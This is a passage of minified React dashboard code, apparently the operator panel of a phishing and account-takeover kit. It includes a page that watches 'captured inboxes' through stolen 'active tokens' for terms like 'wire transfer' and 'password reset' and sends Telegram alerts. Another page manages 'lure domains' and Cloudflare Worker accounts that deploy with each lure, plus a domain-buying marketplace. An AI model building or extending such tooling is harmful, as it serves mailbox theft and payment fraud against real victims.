    d();
  }, []),
    (0, _.useEffect)(() => {
      e === `alerts` && f();
    }, [e]));
  async function d() {
    s(!0);
    try {
      let e = await jo();
      r(Array.isArray(e) ? e : []);
    } catch {
      u(`Failed to load keywords`, `error`);
    } finally {
      s(!1);
    }
  }
  async function f() {
    try {
      let e = await Fo(200);
      a(Array.isArray(e) ? e : []);
    } catch {
      u(`Failed to load alerts`, `error`);
    }
  }
  async function p(e) {
    try {
      (await No(e.id),
        u(e.enabled ? `Keyword disabled` : `Keyword enabled`, `success`),
        d());
    } catch {
      u(`Toggle failed`, `error`);
    }
  }
  async function m(e) {
    if (confirm(`Delete keyword "${e.keyword}"?`))
      try {
        (await Po(e.id), u(`Keyword deleted`, `success`), d());
      } catch {
        u(`Delete failed`, `error`);
      }
  }
  async function h() {
    if (confirm(`Clear all alerts?`))
      try {
        (await Io(), u(`Alerts cleared`, `success`), a([]));
      } catch {
        u(`Clear failed`, `error`);
      }
  }
  return o
    ? (0, R.jsx)(`div`, {
        className: `text-text-muted text-sm py-12 text-center`,
        children: `Loading...`,
      })
    : (0, R.jsxs)(`div`, {
        children: [
          (0, R.jsxs)(`div`, {
            className: `flex items-center justify-between mb-5`,
            children: [
              (0, R.jsxs)(`div`, {
                children: [
                  (0, R.jsx)(`h1`, {
                    className: `text-lg font-bold tracking-wider uppercase`,
                    children: `Keywords`,
                  }),
                  (0, R.jsx)(`p`, {
                    className: `text-xs text-text-muted mt-1`,
                    children: `Get alerted when specific keywords appear in captured inboxes`,
                  }),
                ],
              }),
              (0, R.jsx)(V, {
                size: `sm`,
                onClick: () => l(!0),
                children: (0, R.jsxs)(`span`, {
                  className: `flex items-center gap-1.5`,
                  children: [(0, R.jsx)(_i, { size: 12 }), ` Add Keyword`],
                }),
              }),
            ],
          }),
          (0, R.jsx)(Ha, {
            title: `Keyword Alerts`,
            tips: [
              `Add keywords like 'invoice', 'wire transfer', 'password reset' to monitor captured inboxes.`,
              `The system scans all your active tokens in real-time and sends Telegram alerts when matches are found.`,
              `Check the Alerts tab to see all keyword matches with email previews.`,
            ],
            learnMoreCategory: `keywords`,
          }),
          (0, R.jsxs)(`div`, {
            className: `flex gap-0 mb-4 border-b border-border`,
            children: [
              (0, R.jsxs)(Ro, {
                active: e === `listeners`,
                onClick: () => t(`listeners`),
                children: [
                  (0, R.jsx)(Dr, { size: 12 }),
                  ` Listeners (`,
                  n.length,
                  `)`,
                ],
              }),
              (0, R.jsxs)(Ro, {
                active: e === `alerts`,
                onClick: () => t(`alerts`),
                children: [
                  (0, R.jsx)(Fr, { size: 12 }),
                  ` Alerts (`,
                  i.length,
                  `)`,
                ],
              }),
            ],
          }),
          e === `listeners` &&
            (0, R.jsx)(`div`, {
              className: `bg-surface border border-border`,
              children:
                n.length === 0
                  ? (0, R.jsx)(`div`, {
                      className: `text-sm text-text-muted py-12 text-center`,
                      children: `No keyword listeners configured. Add one to start monitoring.`,
                    })
                  : (0, R.jsxs)(`table`, {
                      className: `w-full text-sm`,
                      children: [
                        (0, R.jsx)(`thead`, {
                          children: (0, R.jsxs)(`tr`, {
                            className: `border-b border-border`,
                            children: [
                              (0, R.jsx)(`th`, {
                                className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-5 font-bold`,
                                children: `Keyword`,
                              }),
                              (0, R.jsx)(`th`, {
                                className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
                                children: `Match In`,
                              }),
                              (0, R.jsx)(`th`, {
                                className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
                                children: `Status`,
                              }),
                              (0, R.jsx)(`th`, {
                                className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
                                children: `Controls`,
                              }),
                            ],
                          }),
                        }),
                        (0, R.jsx)(`tbody`, {
                          children: n.map((e) =>
                            (0, R.jsxs)(
                              `tr`,
                              {
                                className: `border-b border-border/50 hover:bg-slate-50 transition-colors`,
                                children: [
                                  (0, R.jsx)(`td`, {
                                    className: `py-2.5 px-5 text-[13px] font-medium font-mono`,
                                    children: e.keyword,
                                  }),
                                  (0, R.jsx)(`td`, {
                                    className: `py-2.5 px-3 text-[11px] text-text-secondary uppercase`,
                                    children: e.match_in || `subject + body`,
                                  }),
                                  (0, R.jsx)(`td`, {
                                    className: `py-2.5 px-3`,
                                    children: (0, R.jsx)(la, {
                                      status: e.enabled
                                        ? `active`
                                        : `suspended`,
                                      label: e.enabled ? `Active` : `Paused`,
                                    }),
                                  }),
                                  (0, R.jsx)(`td`, {
                                    className: `py-2 px-3`,
                                    children: (0, R.jsxs)(`div`, {
                                      className: `flex gap-1`,
                                      children: [
                                        (0, R.jsxs)(`button`, {
                                          onClick: () => p(e),
                                          className: `flex items-center gap-1 px-2 py-1 text-[10px] font-semibold uppercase tracking-wider cursor-pointer transition-colors text-text-secondary hover:text-slate-900 hover:bg-slate-100`,
                                          children: [
                                            e.enabled
                                              ? (0, R.jsx)(Ii, { size: 12 })
                                              : (0, R.jsx)(Fi, { size: 12 }),
                                            (0, R.jsx)(`span`, {
                                              children: e.enabled
                                                ? `Pause`
                                                : `Enable`,
                                            }),
                                          ],
                                        }),
                                        (0, R.jsxs)(`button`, {
                                          onClick: () => m(e),
                                          className: `flex items-center gap-1 px-2 py-1 text-[10px] font-semibold uppercase tracking-wider cursor-pointer transition-colors text-text-secondary hover:text-danger hover:bg-danger/10`,
                                          children: [
                                            (0, R.jsx)(I, { size: 12 }),
                                            (0, R.jsx)(`span`, {
                                              children: `Delete`,
                                            }),
                                          ],
                                        }),
                                      ],
                                    }),
                                  }),
                                ],
                              },
                              e.id,
                            ),
                          ),
                        }),
                      ],
                    }),
            }),
          e === `alerts` &&
            (0, R.jsxs)(`div`, {
              className: `bg-surface border border-border`,
              children: [
                (0, R.jsxs)(`div`, {
                  className: `flex items-center justify-between px-5 py-3 border-b border-border`,
                  children: [
                    (0, R.jsx)(`h3`, {
                      className: `text-xs font-bold uppercase tracking-wider text-text-muted`,
                      children: `Recent Alerts`,
                    }),
                    i.length > 0 &&
                      (0, R.jsx)(V, {
                        variant: `danger`,
                        size: `sm`,
                        onClick: h,
                        children: `Clear All`,
                      }),
                  ],
                }),
                i.length === 0
                  ? (0, R.jsx)(`div`, {
                      className: `text-sm text-text-muted py-12 text-center`,
                      children: `No keyword alerts yet.`,
                    })
                  : (0, R.jsxs)(`table`, {
                      className: `w-full text-sm`,
                      children: [
                        (0, R.jsx)(`thead`, {
                          children: (0, R.jsxs)(`tr`, {
                            className: `border-b border-border`,
                            children: [
                              (0, R.jsx)(`th`, {
                                className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-5 font-bold`,
                                children: `Keyword`,
                              }),
                              (0, R.jsx)(`th`, {
                                className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
                                children: `Account`,
                              }),
                              (0, R.jsx)(`th`, {
                                className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
                                children: `From`,
                              }),
                              (0, R.jsx)(`th`, {
                                className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
                                children: `Subject`,
                              }),
                              (0, R.jsx)(`th`, {
                                className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
                                children: `Time`,
                              }),
                            ],
                          }),
                        }),
                        (0, R.jsx)(`tbody`, {
                          children: i.map((e) =>
                            (0, R.jsxs)(
                              `tr`,
                              {
                                className: `border-b border-border/50 hover:bg-slate-50 transition-colors`,
                                children: [
                                  (0, R.jsx)(`td`, {
                                    className: `py-2.5 px-5 text-[13px] font-medium font-mono text-active`,
                                    children: e.keyword_matched,
                                  }),
                                  (0, R.jsx)(`td`, {
                                    className: `py-2.5 px-3 text-[11px] text-text-secondary`,
                                    children: e.account_email ?? `—`,
                                  }),
                                  (0, R.jsx)(`td`, {
                                    className: `py-2.5 px-3 text-[11px] text-text-secondary truncate max-w-[150px]`,
                                    children: e.email_from,
                                  }),
                                  (0, R.jsx)(`td`, {
                                    className: `py-2.5 px-3 text-[13px] text-text truncate max-w-[250px]`,
                                    children: e.email_subject,
                                  }),
                                  (0, R.jsx)(`td`, {
                                    className: `py-2.5 px-3 text-[11px] text-text-muted whitespace-nowrap`,
                                    children: new Date(
                                      e.alerted_at,
                                    ).toLocaleString(),
                                  }),
                                ],
                              },
                              e.id,
                            ),
                          ),
                        }),
                      ],
                    }),
              ],
            }),
          c &&
            (0, R.jsx)(zo, {
              onClose: () => l(!1),
              onCreated: () => {
                (l(!1), d());
              },
            }),
        ],
      });
}
function Ro({ active: e, onClick: t, children: n }) {
  return (0, R.jsx)(`button`, {
    onClick: t,
    className: `flex items-center gap-1.5 px-4 py-2.5 text-[11px] font-bold uppercase tracking-wider transition-colors cursor-pointer border-b-2 -mb-px ${e ? `border-slate-800 text-slate-900` : `border-transparent text-text-muted hover:text-text-secondary`}`,
    children: n,
  });
}
function zo({ onClose: e, onCreated: t }) {
  let [n, r] = (0, _.useState)(``),
    [i, a] = (0, _.useState)(`all`),
    [o, s] = (0, _.useState)(!1),
    c = z((e) => e.add);
  async function l() {
    if (!n.trim()) {
      c(`Enter a keyword`, `error`);
      return;
    }
    s(!0);
    try {
      let e = await Mo({ keyword: n.trim(), match_in: i });
      e.success
        ? (c(`Keyword added`, `success`), t())
        : c(e.error || `Failed`, `error`);
    } catch {
      c(`Failed to add keyword`, `error`);
    } finally {
      s(!1);
    }
  }
  return (0, R.jsx)(Sa, {
    open: !0,
    title: `Add Keyword`,
    onClose: e,
    children: (0, R.jsxs)(`div`, {
      className: `space-y-4`,
      children: [
        (0, R.jsxs)(`div`, {
          children: [
            (0, R.jsx)(`label`, {
              className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-1`,
              children: `Keyword`,
            }),
            (0, R.jsx)(`input`, {
              type: `text`,
              value: n,
              onChange: (e) => r(e.target.value),
              placeholder: `e.g. password reset, wire transfer, invoice`,
              className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light`,
              autoFocus: !0,
            }),
          ],
        }),
        (0, R.jsxs)(`div`, {
          children: [
            (0, R.jsx)(`label`, {
              className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-1`,
              children: `Match In`,
            }),
            (0, R.jsxs)(`select`, {
              value: i,
              onChange: (e) => a(e.target.value),
              className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm`,
              children: [
                (0, R.jsx)(`option`, {
                  value: `all`,
                  children: `Subject + Body`,
                }),
                (0, R.jsx)(`option`, {
                  value: `subject`,
                  children: `Subject Only`,
                }),
                (0, R.jsx)(`option`, { value: `body`, children: `Body Only` }),
                (0, R.jsx)(`option`, {
                  value: `sender`,
                  children: `From Address`,
                }),
              ],
            }),
          ],
        }),
        (0, R.jsxs)(`div`, {
          className: `flex gap-2 pt-2`,
          children: [
            (0, R.jsx)(V, {
              onClick: l,
              disabled: o,
              children: o ? `Adding...` : `Add Keyword`,
            }),
            (0, R.jsx)(V, { variant: `ghost`, onClick: e, children: `Cancel` }),
          ],
        }),
      ],
    }),
  });
}
async function Bo() {
  return P(`/dash/linked-domains`);
}
async function Vo(e, t, n, r, i) {
  return P(`/dash/linked-domains/add`, {
    method: `POST`,
    body: JSON.stringify({
      domain: e,
      turnstile_site_key: t,
      turnstile_secret_key: n,
      cf_zone_id: r,
      cf_api_token: i,
    }),
  });
}
async function Ho(e, t, n, r, i) {
  return P(`/dash/linked-domains/turnstile/${e}`, {
    method: `POST`,
    body: JSON.stringify({
      turnstile_site_key: t,
      turnstile_secret_key: n,
      cf_zone_id: r,
      cf_api_token: i,
    }),
  });
}
async function Uo(e) {
  return P(`/dash/linked-domains/delete/${e}`, { method: `POST` });
}
async function Wo() {
  return P(`/dash/workers/credentials`);
}
async function Go(e) {
  return P(`/dash/workers/credentials`, {
    method: `POST`,
    body: JSON.stringify(e),
  });
}
async function Ko(e) {
  return P(`/dash/workers/credentials/${e}/delete`, { method: `POST` });
}
async function qo() {
  return P(`/dash/marketplace/credits`);
}
async function Jo(e) {
  return P(`/dash/marketplace/search-domain`, {
    method: `POST`,
    body: JSON.stringify({ domain: e }),
  });
}
async function Yo(e) {
  return P(`/dash/marketplace/buy-domain`, {
    method: `POST`,
    body: JSON.stringify({ domain: e }),
  });
}
async function Xo() {
  return P(`/dash/marketplace/my-domains`);
}
function Zo() {
  let [e, t] = (0, _.useState)(`linked`);
  return (0, R.jsxs)(`div`, {
    children: [
      (0, R.jsx)(`div`, {
        className: `flex items-center justify-between mb-5`,
        children: (0, R.jsxs)(`div`, {
          children: [
            (0, R.jsx)(`h1`, {
              className: `text-lg font-bold tracking-wider uppercase`,
              children: `Domains`,
            }),
            (0, R.jsx)(`p`, {
              className: `text-xs text-text-muted mt-1`,
              children: `Manage your lure domains, CF Workers, and domain marketplace`,
            }),
          ],
        }),
      }),
      (0, R.jsxs)(`div`, {
        className: `flex gap-0 mb-4 border-b border-border`,
        children: [
          (0, R.jsxs)(Qo, {
            active: e === `linked`,
            onClick: () => t(`linked`),
            children: [(0, R.jsx)($r, { size: 12 }), ` Linked Domains`],
          }),
          (0, R.jsxs)(Qo, {
            active: e === `worker`,
            onClick: () => t(`worker`),
            children: [(0, R.jsx)(Br, { size: 12 }), ` CF Worker`],
          }),
          (0, R.jsxs)(Qo, {
            active: e === `marketplace`,
            onClick: () => t(`marketplace`),
            children: [(0, R.jsx)(ki, { size: 12 }), ` Marketplace`],
          }),
        ],
      }),
      e === `linked` && (0, R.jsx)($o, {}),
      e === `worker` && (0, R.jsx)(es, {}),
      e === `marketplace` && (0, R.jsx)(ns, {}),
    ],
  });
}
function Qo({ active: e, onClick: t, children: n }) {
  return (0, R.jsx)(`button`, {
    onClick: t,
    className: `flex items-center gap-1.5 px-4 py-2.5 text-[11px] font-bold uppercase tracking-wider transition-colors cursor-pointer border-b-2 -mb-px ${e ? `border-slate-800 text-slate-900` : `border-transparent text-text-muted hover:text-text-secondary`}`,
    children: n,
  });
}
function $o() {
  let [e, t] = (0, _.useState)([]),
    [n, r] = (0, _.useState)(!0),
    [i, a] = (0, _.useState)(!1),
    [o, s] = (0, _.useState)(null),
    c = z((e) => e.add);
  (0, _.useEffect)(() => {
    l();
  }, []);
  async function l() {
    r(!0);
    try {
      let e = await Bo();
      t(Array.isArray(e) ? e : []);
    } catch {
      c(`Failed to load domains`, `error`);
    } finally {
      r(!1);
    }
  }
  async function u(e) {
    if (confirm(`Delete ${e.domain}?`))
      try {
        (await Uo(e.id), c(`Domain removed`, `success`), l());
      } catch {
        c(`Delete failed`, `error`);
      }
  }
  return n
    ? (0, R.jsx)(`div`, {
        className: `text-text-muted text-sm py-12 text-center`,
        children: `Loading...`,
      })
    : (0, R.jsxs)(R.Fragment, {
        children: [
          (0, R.jsx)(`div`, {
            className: `flex justify-end mb-3`,
            children: (0, R.jsx)(V, {
              size: `sm`,
              onClick: () => a(!0),
              children: (0, R.jsxs)(`span`, {
                className: `flex items-center gap-1.5`,
                children: [(0, R.jsx)(_i, { size: 12 }), ` Link Domain`],
              }),
            }),
          }),
          (0, R.jsx)(`div`, {
            className: `bg-surface border border-border`,
            children:
              e.length === 0
                ? (0, R.jsxs)(`div`, {
                    className: `text-sm text-text-muted py-12 text-center`,
                    children: [
                      (0, R.jsx)($r, {
                        size: 24,
                        className: `mx-auto mb-2 opacity-40`,
                      }),
                      `No linked domains. Click "Link Domain" to add one via DNS.`,
                    ],
                  })
                : (0, R.jsxs)(`table`, {
                    className: `w-full text-sm`,
                    children: [
                      (0, R.jsx)(`thead`, {
                        children: (0, R.jsxs)(`tr`, {
                          className: `border-b border-border`,
                          children: [
                            (0, R.jsx)(rs, { children: `Domain` }),
                            (0, R.jsx)(rs, { children: `Turnstile` }),
                            (0, R.jsx)(rs, { children: `Actions` }),
                          ],
                        }),
                      }),
                      (0, R.jsx)(`tbody`, {
                        children: e.map((e) =>
                          (0, R.jsxs)(
                            `tr`,
                            {
                              className: `border-b border-border/50 hover:bg-slate-50 transition-colors`,
                              children: [
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-5 text-[13px] font-medium`,
                                  children: e.domain,
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3`,
                                  children: e.turnstile_site_key
                                    ? (0, R.jsxs)(`span`, {
                                        className: `inline-flex items-center gap-1 text-[10px] font-semibold text-active`,
                                        children: [
                                          (0, R.jsx)(Oi, { size: 10 }),
                                          ` Active`,
                                        ],
                                      })
                                    : (0, R.jsx)(`span`, {
                                        className: `text-[10px] text-text-muted`,
                                        children: `—`,
                                      }),
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2 px-3`,
                                  children: (0, R.jsxs)(`div`, {
                                    className: `flex gap-1`,
                                    children: [
                                      (0, R.jsxs)(is, {
                                        onClick: () => s(e),
                                        color: `hover:text-blue-600 hover:bg-blue-50`,
                                        children: [
                                          (0, R.jsx)(Oi, { size: 12 }),
                                          ` Settings`,
                                        ],
                                      }),
                                      (0, R.jsxs)(is, {
                                        onClick: () => u(e),
                                        color: `hover:text-danger hover:bg-danger/10`,
                                        children: [
                                          (0, R.jsx)(I, { size: 12 }),
                                          ` Delete`,
                                        ],
                                      }),
                                    ],
                                  }),
                                }),
                              ],
                            },
                            e.id,
                          ),
                        ),
                      }),
                    ],
                  }),
          }),
          i &&
            (0, R.jsx)(as, {
              onClose: () => a(!1),
              onAdded: () => {
                (a(!1), l());
              },
            }),
          o &&
            (0, R.jsx)(os, {
              domain: o,
              onClose: () => s(null),
              onSaved: () => {
                (s(null), l());
              },
            }),
        ],
      });
}
function es() {
  let [e, t] = (0, _.useState)([]),
    [n, r] = (0, _.useState)(!0),
    [i, a] = (0, _.useState)(!1),
    o = z((e) => e.add);
  (0, _.useEffect)(() => {
    s();
  }, []);
  async function s() {
    r(!0);
    try {
      let e = await Wo();
      t(Array.isArray(e) ? e : []);
    } catch {
      o(`Failed to load worker data`, `error`);
    } finally {
      r(!1);
    }
  }
  async function c(e, n) {
    if (confirm(`Remove CF account "${n}"?`))
      try {
        (await Ko(e),
          o(`Account removed`, `success`),
          t((t) => t.filter((t) => t.id !== e)));
      } catch {
        o(`Delete failed`, `error`);
      }
  }
  return n
    ? (0, R.jsx)(`div`, {
        className: `text-text-muted text-sm py-12 text-center`,
        children: `Loading...`,
      })
    : (0, R.jsxs)(`div`, {
        className: `space-y-4`,
        children: [
          (0, R.jsxs)(`div`, {
            className: `bg-surface border border-border p-5`,
            children: [
              (0, R.jsxs)(`div`, {
                className: `flex items-center justify-between mb-4`,
                children: [
                  (0, R.jsxs)(`div`, {
                    children: [
                      (0, R.jsx)(`h3`, {
                        className: `text-xs font-bold uppercase tracking-wider`,
                        children: `CF Accounts`,
                      }),
                      (0, R.jsx)(`p`, {
                        className: `text-[10px] text-text-muted mt-0.5`,
                        children: `Workers are deployed automatically when creating a lure.`,
                      }),
                    ],
                  }),
                  (0, R.jsx)(V, {
                    size: `sm`,
                    onClick: () => a(!0),
                    children: (0, R.jsxs)(`span`, {
                      className: `flex items-center gap-1.5`,
                      children: [(0, R.jsx)(_i, { size: 12 }), ` Add Account`],
                    }),
                  }),
                ],
              }),
              e.length === 0
                ? (0, R.jsx)(`p`, {
                    className: `text-xs text-text-muted py-4 text-center`,
                    children: `No CF accounts added yet. Click "Add Account" to get started.`,
                  })
                : (0, R.jsx)(`div`, {
                    className: `space-y-2`,
                    children: e.map((e) =>
                      (0, R.jsxs)(
                        `div`,
                        {
                          className: `bg-bg border border-border p-3 flex items-center gap-3`,
                          children: [
                            (0, R.jsxs)(`div`, {
                              className: `flex-1 min-w-0`,
                              children: [
                                (0, R.jsx)(`div`, {
                                  className: `text-xs font-bold text-text mb-0.5`,
                                  children: e.name,
                                }),
                                (0, R.jsx)(`div`, {
                                  className: `text-[11px] text-text-muted font-mono`,
                                  children: e.cf_email,
                                }),
                                e.workers_dev_subdomain &&
                                  (0, R.jsxs)(`div`, {
                                    className: `text-[10px] text-text-muted mt-0.5`,
                                    children: [
                                      e.workers_dev_subdomain,
                                      `.workers.dev`,
                                    ],
                                  }),
                              ],
                            }),
                            (0, R.jsxs)(`div`, {
                              className: `flex items-center gap-2 flex-shrink-0`,
                              children: [
                                e.turnstile_site_key &&
                                  (0, R.jsx)(`span`, {
                                    className: `text-[10px] bg-blue-500/10 text-blue-400 px-1.5 py-0.5`,
                                    children: `Turnstile`,
                                  }),
                                (0, R.jsx)(`button`, {
                                  onClick: () => c(e.id, e.name),
                                  className: `text-red-400 hover:text-red-300 cursor-pointer p-1`,
                                  children: (0, R.jsx)(I, { size: 13 }),
                                }),
                              ],
                            }),
                          ],
                        },
                        e.id,
                      ),
                    ),
                  }),
            ],
          }),
          i &&
            (0, R.jsx)(ts, {
              onClose: () => a(!1),
              onDone: () => {
                (a(!1), s());
              },
            }),
        ],
      });
}
function ts({ onClose: e, onDone: t }) {
  let [n, r] = (0, _.useState)(``),
    [i, a] = (0, _.useState)(``),
    [o, s] = (0, _.useState)(``),
    [c, l] = (0, _.useState)(``),
    [u, d] = (0, _.useState)(``),
    [f, p] = (0, _.useState)(!1),
    m = z((e) => e.add);
  async function h() {
    if (!n.trim()) {
      m(`Account name required`, `error`);
      return;
    }
    if (!i.trim() || !o.trim()) {
      m(`Email and API key required`, `error`);
      return;
    }
    p(!0);
    try {
      let e = await Go({
        name: n.trim(),
        cf_email: i.trim(),
        cf_api_key: o.trim(),
        turnstile_site_key: c.trim(),
        turnstile_secret_key: u.trim(),
      });
      e.success
        ? (m(`Account added`, `success`), t())
        : m(e.error || `Save failed`, `error`);
    } catch {
      m(`Save failed`, `error`);
    } finally {
      p(!1);
    }
  }
  return (0, R.jsx)(Sa, {
    open: !0,
    title: `Add CF Account`,
    onClose: e,
    width: `max-w-lg`,
    children: (0, R.jsxs)(`div`, {
      className: `space-y-4`,
      children: [
        (0, R.jsxs)(`div`, {
          children: [
            (0, R.jsx)(`label`, {
              className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-1`,
              children: `Account Name`,
            }),
            (0, R.jsx)(`input`, {
              type: `text`,
              value: n,
              onChange: (e) => r(e.target.value),
              placeholder: `e.g. Main Account, Client A`,
              className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm focus:outline-none`,
            }),
          ],
        }),
        (0, R.jsxs)(`div`, {
          children: [
            (0, R.jsx)(`label`, {
              className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-1`,
              children: `Cloudflare Email`,
            }),
            (0, R.jsx)(`input`, {
              type: `email`,
              value: i,
              onChange: (e) => a(e.target.value),
              placeholder: `you@example.com`,
              className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm focus:outline-none`,
            }),
          ],
        }),
        (0, R.jsxs)(`div`, {
          children: [
            (0, R.jsx)(`label`, {
              className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-1`,
              children: `Global API Key`,
            }),
            (0, R.jsx)(`input`, {
              type: `password`,
              value: o,
              onChange: (e) => s(e.target.value),
              placeholder: `Your Cloudflare Global API Key`,
              className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm focus:outline-none`,
            }),
          ],
        }),
        (0, R.jsxs)(`div`, {
          className: `border-t border-border pt-4`,
          children: [
            (0, R.jsx)(`p`, {
              className: `text-[10px] text-text-muted uppercase tracking-wider font-bold mb-3`,
              children: `Turnstile (optional)`,
            }),
            (0, R.jsxs)(`div`, {
              className: `space-y-3`,
              children: [
                (0, R.jsxs)(`div`, {
                  children: [
                    (0, R.jsx)(`label`, {
                      className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-1`,
                      children: `Site Key`,
                    }),
                    (0, R.jsx)(`input`, {
                      type: `text`,
                      value: c,
                      onChange: (e) => l(e.target.value),
                      placeholder: `0x4AAAAAAA...`,
                      className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm focus:outline-none`,
                    }),
                  ],
                }),
                (0, R.jsxs)(`div`, {
                  children: [
                    (0, R.jsx)(`label`, {
                      className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-1`,
                      children: `Secret Key`,
                    }),
                    (0, R.jsx)(`input`, {
                      type: `password`,
                      value: u,
                      onChange: (e) => d(e.target.value),
                      placeholder: `0x4AAAAAAA...`,
                      className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm focus:outline-none`,
                    }),
                  ],
                }),
              ],
            }),
          ],
        }),
        (0, R.jsxs)(`div`, {
          className: `flex gap-2 pt-1`,
          children: [
            (0, R.jsx)(V, {
              onClick: h,
              disabled: f,
              children: f ? `Saving...` : `Add Account`,
            }),
            (0, R.jsx)(V, { variant: `ghost`, onClick: e, children: `Cancel` }),
          ],
        }),
      ],
    }),
  });
}
function ns() {
  let [e, t] = (0, _.useState)([]),
    [n, r] = (0, _.useState)(0),
    [i, a] = (0, _.useState)(``),
    [o, s] = (0, _.useState)([]),
    [c, l] = (0, _.useState)(!1),
    [u, d] = (0, _.useState)(null),
    [f, p] = (0, _.useState)(!0),
    m = z((e) => e.add);
  (0, _.useEffect)(() => {
    Promise.all([
      Xo()
        .then(t)
        .catch(() => {}),
      qo()
        .then((e) => r(e.balance ?? 0))
        .catch(() => {}),
    ]).finally(() => p(!1));
  }, []);
  async function h() {
    if (i.trim()) {
      (l(!0), s([]));
      try {
        let e = await Jo(i.trim());
        e.success && e.results ? s(e.results) : m(`No results found`, `error`);
      } catch {
        m(`Search failed`, `error`);
      } finally {
        l(!1);
      }
    }
  }
  async function g(e) {
    d(e);
    try {
      let n = await Yo(e);
      n.success
        ? (m(`Purchased ${e}`, `success`),
          s([]),
          a(``),
          t(await Xo()),
          r((await qo()).balance ?? 0))
        : m(n.error || `Purchase failed`, `error`);
    } catch {
      m(`Purchase failed`, `error`);
    } finally {
      d(null);
    }
  }
  return f
    ? (0, R.jsx)(`div`, {
        className: `text-text-muted text-sm py-12 text-center`,
        children: `Loading...`,
      })
    : (0, R.jsxs)(`div`, {
        className: `space-y-6`,
        children: [
          (0, R.jsx)(`div`, {
            className: `bg-surface border border-border p-5`,
            children: (0, R.jsxs)(`div`, {
              className: `flex items-center justify-between`,
              children: [
                (0, R.jsxs)(`div`, {
                  children: [
                    (0, R.jsx)(`div`, {
                      className: `text-[10px] text-text-muted uppercase tracking-wider font-bold`,
                      children: `Credit Balance`,
                    }),
                    (0, R.jsxs)(`div`, {
                      className: `text-2xl font-bold mt-1`,
                      children: [`$`, n.toFixed(2)],
                    }),
                  ],
                }),
                (0, R.jsx)(ki, { size: 20, className: `text-text-muted` }),
              ],
            }),
          }),
          (0, R.jsxs)(`div`, {
            className: `bg-surface border border-border p-5`,
            children: [
              (0, R.jsx)(`h3`, {
                className: `text-xs font-bold uppercase tracking-wider text-text-muted mb-3`,
                children: `Search & Buy Domain`,
              }),
              (0, R.jsxs)(`div`, {
                className: `flex gap-2`,
                children: [
                  (0, R.jsxs)(`div`, {
                    className: `relative flex-1`,
                    children: [
                      (0, R.jsx)(xi, {
                        size: 14,
                        className: `absolute left-3 top-1/2 -translate-y-1/2 text-text-muted`,
                      }),
                      (0, R.jsx)(`input`, {
                        type: `text`,
                        value: i,
                        onChange: (e) => a(e.target.value),
                        onKeyDown: (e) => e.key === `Enter` && h(),
                        placeholder: `e.g. mycompany.com`,
                        className: `w-full bg-bg border border-border text-text pl-9 pr-3 py-2.5 text-sm focus:outline-none focus:border-border-light`,
                      }),
                    ],
                  }),
                  (0, R.jsx)(V, {
                    variant: `secondary`,
                    onClick: h,
                    disabled: c,
                    children: c
                      ? (0, R.jsxs)(`span`, {
                          className: `flex items-center gap-1.5`,
                          children: [
                            (0, R.jsx)(ci, {
                              size: 12,
                              className: `animate-spin`,
                            }),
                            ` Searching...`,
                          ],
                        })
                      : `Search`,
                  }),
                ],
              }),
              o.length > 0 &&
                (0, R.jsx)(`div`, {
                  className: `mt-3 space-y-1`,
                  children: o.map((e) =>
                    (0, R.jsxs)(
                      `div`,
                      {
                        className: `p-3 border border-border bg-bg flex items-center justify-between`,
                        children: [
                          (0, R.jsxs)(`div`, {
                            className: `flex items-center gap-2`,
                            children: [
                              e.available
                                ? (0, R.jsx)(Ir, {
                                    size: 14,
                                    className: `text-active`,
                                  })
                                : (0, R.jsx)(Rr, {
                                    size: 14,
                                    className: `text-danger`,
                                  }),
                              (0, R.jsx)(`span`, {
                                className: `text-sm font-medium font-mono`,
                                children: e.domain,
                              }),
                              e.available &&
                                e.price != null &&
                                (0, R.jsxs)(`span`, {
                                  className: `text-xs font-bold text-active`,
                                  children: [`$`, e.price.toFixed(2)],
                                }),
                              !e.available &&
                                (0, R.jsx)(`span`, {
                                  className: `text-xs text-text-muted`,
                                  children: `Unavailable`,
                                }),
                            ],
                          }),
                          e.available &&
                            (0, R.jsx)(V, {
                              size: `sm`,
                              onClick: () => g(e.domain),
                              disabled: u === e.domain,
                              children:
                                u === e.domain ? `Buying...` : `Buy Now`,
                            }),
                        ],
                      },
                      e.domain,
                    ),
                  ),
                }),
            ],
          }),
          (0, R.jsxs)(`div`, {
            className: `bg-surface border border-border`,
            children: [
              (0, R.jsx)(`div`, {
                className: `px-5 py-3 border-b border-border`,
                children: (0, R.jsxs)(`h3`, {
                  className: `text-xs font-bold uppercase tracking-wider text-text-muted`,
                  children: [`My Purchased Domains (`, e.length, `)`],
                }),
              }),
              e.length === 0
                ? (0, R.jsx)(`div`, {
                    className: `text-sm text-text-muted py-12 text-center`,
                    children: `No domains purchased yet.`,
                  })
                : (0, R.jsxs)(`table`, {
                    className: `w-full text-sm`,
                    children: [
                      (0, R.jsx)(`thead`, {
                        children: (0, R.jsxs)(`tr`, {
                          className: `border-b border-border`,
